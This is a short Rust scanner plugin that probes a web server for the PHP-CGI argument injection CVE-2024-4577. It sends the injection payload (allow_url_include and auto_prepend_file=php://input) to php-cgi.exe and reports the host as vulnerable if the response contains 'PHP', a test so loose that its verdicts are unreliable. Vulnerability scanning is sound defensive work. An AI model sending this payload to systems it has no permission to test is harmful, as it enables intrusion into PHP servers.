/* http-vuln-cve2024-4577-4 - PHP CGI argument injection probe. */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
    if !valid(ctx) {
        return 1;
    }
    let resp = match http_request(ctx, "GET", "/php-cgi/php-cgi.exe?%add+allow_url_include%3d1+%add+auto_prepend_file%3dphp://input", None, "", "", None, 8192) {
        Some(r) if !r.is_empty() => r,
        _ => {
            set_out(ctx, "http-vuln-cve2024-4577-4: no HTTP response");
            return 0;
        }
    };
    let code = http_status(&resp);
    if contains_ci(&resp, "PHP") {
        set_out(ctx, &format!("VULNERABLE: /php-cgi/php-cgi.exe?%add+allow_url_include%3d1+%add+auto_prepend_file%3dphp://input [{}] (CVE-2024-4577)", code));
    } else {
        set_out(ctx, &format!("not vulnerable: CVE-2024-4577 (/php-cgi/php-cgi.exe?%add+allow_url_include%3d1+%add+auto_prepend_file%3dphp://input [{}])", code));
    }
    0
}
